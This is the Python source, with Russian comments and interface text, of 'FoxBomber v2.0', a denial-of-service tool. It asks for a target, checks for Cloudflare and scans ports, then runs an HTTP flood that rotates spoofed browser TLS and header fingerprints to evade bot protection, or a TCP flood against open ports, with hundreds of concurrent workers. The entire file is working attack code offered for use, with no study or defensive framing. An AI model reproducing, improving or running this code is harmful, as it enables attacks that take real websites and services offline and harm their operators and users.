import asyncio
import socket
import random
import time
import sys
from curl_cffi import requests as cffi_requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.text import Text
from rich.prompt import Prompt, IntPrompt

console = Console()

# База профилей браузеров (TLS отпечаток + HTTP заголовки должны совпадать)
BROWSER_PROFILES = [
    {
        "impersonate": "chrome120",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "platform": "Windows",
        "mobile": "?0"
    },
    {
        "impersonate": "chrome120",
        "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "platform": "macOS",
        "mobile": "?0"
    },
    {
        "impersonate": "edge101",
        "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
        "sec_ch_ua": '"Not A;Brand";v="99", "Chromium";v="120", "Microsoft Edge";v="120"',
        "platform": "Windows",
        "mobile": "?0"
    },
    {
        "impersonate": "chrome120",
        "ua": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "platform": "Linux",
        "mobile": "?0"
    }
]

LANGUAGES = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7", "de-DE,de;q=0.9,en;q=0.8"]
SCREEN_SIZES = ["1920,1080", "2560,1440", "1366,768", "1440,900", "1536,864"]
FONTS = ["Arial", "Helvetica", "Times New Roman", "Courier New", "Verdana", "Georgia", "Comic Sans MS"]
CACHE_VALS = ["max-age=0", "no-cache", "no-cache, no-store, must-revalidate"]

def generate_headers():
    """Генерирует пакет отпечатков, логически связанных между собой"""
    profile = random.choice(BROWSER_PROFILES)
    
    # Разбиваем размер экрана
    screen_w, screen_h = random.choice(SCREEN_SIZES).split(',')
    
    headers = {
        "User-Agent": profile["ua"],
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": random.choice(LANGUAGES),
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-CH-UA": profile["sec_ch_ua"],
        "Sec-CH-UA-Mobile": profile["mobile"],
        "Sec-CH-UA-Platform": f'"{profile["platform"]}"',
        "Sec-CH-UA-Platform-Version": f'"{random.choice(["15.0", "14.0", "10.0", "5.15"])}"',
        "Sec-CH-UA-Model": '""',
        "Viewport-Width": screen_w,
        "Width": str(random.randint(320, int(screen_w))),
        "X-Font-List": ",".join(random.sample(FONTS, random.randint(2, len(FONTS)))),
        "Downlink": str(round(random.uniform(1.5, 10.0), 1)),
        "ECT": random.choice(["4g", "3g"]),
        "RTT": str(random.randint(50, 200)),
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": random.choice(CACHE_VALS),
        "Pragma": "no-cache",
    }
    return headers, profile["impersonate"]

class FoxBomber:
    def __init__(self, target):
        self.target = target if target.startswith('http') else f'http://{target}'
        self.host = self.target.split('/')[2]
        try:
            self.ip = socket.gethostbyname(self.host)
        except:
            self.ip = "Unknown"
        
        self.sent = 0
        self.fail = 0
        self.stop_event = False
        self.cf_protected = False
        self.open_ports = []

    async def analyze(self):
        console.print(Panel(f"[bold cyan]Анализ цели:[/bold cyan] {self.host}", title="FoxBomber Recon", border_style="blue"))
        try:
            r = cffi_requests.get(self.target, impersonate="chrome120", timeout=10)
            server = r.headers.get("Server", "Unknown")
            self.cf_protected = "cloudflare" in server.lower() or "cf-ray" in r.headers
            console.print(f"IP Address: [bold green]{self.ip}[/bold green]")
            console.print(f"HTTP Status: [bold green]{r.status_code}[/bold green]")
            console.print(f"Server: [bold yellow]{server}[/bold yellow]")
            console.print(f"Cloudflare Bypass: [bold red]{'YES' if self.cf_protected else 'NO'}[/bold red]")
        except Exception as e:
            console.print(f"[red]Ошибка анализа: {e}[/red]")

        console.print("\n[*] Сканирование портов...")
        ports = [80, 443, 22, 21, 3389, 8080]
        scan_table = Table(show_header=True, header_style="bold magenta")
        scan_table.add_column("Порт")
        scan_table.add_column("Статус")
        
        for p in ports:
            try:
                _, _ = await asyncio.open_connection(self.host, p, limit=1)
                self.open_ports.append(p)
                scan_table.add_row(str(p), "[green]ОТКРЫТ[/green]")
            except:
                scan_table.add_row(str(p), "[red]Закрыт[/red]")
        
        console.print(scan_table)
        return self.open_ports

    async def http_flood_worker(self):
        while not self.stop_event:
            try:
                # Генерируем уникальный отпечаток для каждого запроса
                headers, impersonate = generate_headers()
                async with cffi_requests.AsyncSession() as s:
                    await s.get(self.target, headers=headers, impersonate=impersonate, timeout=5)
                    self.sent += 1
            except:
                self.fail += 1
            await asyncio.sleep(0.01) # Задержка чтобы не перегрузить локальный сокет

    async def tcp_flood_worker(self, port):
        payload = random.randbytes(1024)
        while not self.stop_event:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                await asyncio.to_thread(sock.connect, (self.ip, port))
                await asyncio.to_thread(sock.send, payload)
                sock.close()
                self.sent += 1
            except:
                self.fail += 1

    def generate_ui(self):
        panel = Panel(
            Text.from_markup(f"[bold green]FoxBomber Атакует...[/bold green]\nЦель: {self.host}\nОтправлено: {self.sent}\nОшибок: {self.fail}"),
            title="[bold red]L7/L4 ATTACK IN PROGRESS[/bold red]",
            border_style="red",
            width=50
        )
        return panel

    async def attack(self, method, threads, port=80):
        self.stop_event = False
        tasks = []
        
        if method == '1':
            for _ in range(threads):
                tasks.append(self.http_flood_worker())
        elif method == '2':
            for _ in range(threads):
                tasks.append(self.tcp_flood_worker(port))
                
        console.print(f"[bold green][*] Запуск {threads} потоков... Нажмите Ctrl+C для остановки.[/bold green]")
        
        with Live(self.generate_ui(), refresh_per_second=4, console=console) as live:
            try:
                for task in asyncio.as_completed(tasks):
                    await task
                    if not self.stop_event:
                        live.update(self.generate_ui())
            except asyncio.CancelledError:
                pass
            except KeyboardInterrupt:
                self.stop_event = True
                console.print("\n[bold yellow][!] Атака остановлена пользователем.[/bold yellow]")

async def main():
    console.print(Panel(Text.from_markup("[bold blue]FOX BOMBER v2.0[/bold blue]\nDDoS Tool with Fingerprint Evasion"), border_style="blue", width=50))
    
    target = Prompt.ask("[bold cyan]Введите URL цели[/bold cyan] (например, http://example.com)")
    bomber = FoxBomber(target)
    
    await bomber.analyze()
    
    console.print("\n[bold magenta]Выберите метод атаки:[/bold magenta]")
    console.print("1. HTTP Flood (Layer 7 - Генерация отпечатков и обход CF)")
    console.print("2. TCP Flood (Layer 4 - Прямой удар по портам)")
    
    method = Prompt.ask("Ваш выбор", choices=["1", "2"], default="1")
    
    if method == "2":
        if not bomber.open_ports:
            console.print("[red]Нет открытых портов для TCP атаки![/red]")
            return
        port = IntPrompt.ask("Введите порт для атаки", default=bomber.open_ports[0])
    else:
        port = 80

    threads = IntPrompt.ask("Количество потоков", default=500)
    
    await bomber.attack(method, threads, port)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold red]Выход.[/bold red]")
        sys.exit(0)
